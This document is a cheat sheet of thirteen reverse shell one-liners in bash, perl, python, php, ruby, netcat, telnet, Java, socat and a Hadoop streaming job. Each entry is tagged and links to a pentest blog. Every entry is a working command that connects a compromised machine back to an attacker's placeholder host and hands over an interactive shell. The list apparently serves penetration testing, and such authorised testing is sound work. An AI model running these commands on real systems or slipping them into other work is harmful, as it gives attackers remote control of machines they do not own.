### 1. bash reverse shell
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. perl reverse shell
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**- linux,reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 3. python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**- linux,reverse shells,Windows,python**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 4. php reverse shell : php from the CLI
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**- linux,reverse shells,Windows,php**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 5. ruby reverse shell
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
**- linux,reverse shells,Windows,ruby**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 6. net cat reverse shell
```
nc -e /bin/sh 10.0.0.1 1234
```
**- linux,reverse shells,Windows**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 7. bash reverse shell using a file handle '5'
```
exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 8. telnet reverse shell
```
rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 9. telnet reverse shell
```
telnet [me] [port]| /bin/bash | telnet [me] [lport]
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 10. perl windows reverse shell
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[me]:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
**- reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 11. Java reverse shell - replace ; with newline
```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```
**- linux,reverse shells,java**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 12. Hadoop Command execution, of course replace the shell with whatever you want
```
./bin/hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input /tmp/out/1 -output /tmp/out/NC_1 -mapper "bash -i >& /dev/tcp/[ip]/[port] 0>&1" -reducer NONE -cmdenv user.name=hdfs -cmdenv as=hdfs -verbose -mapdebug "bash -i >& /dev/tcp/[ip]/[port] 0>&1"
```
**- reverse shells**
#### References:

http://seclist.us/hadoop-attack-library-is-a-collection-of-pentest-tools-and-resources-targeting-hadoop-environments.html
__________
### 13. Socat reverse shell, First on client, second on server
```
socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane
```
**- linux,pivoting,reverse shells**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
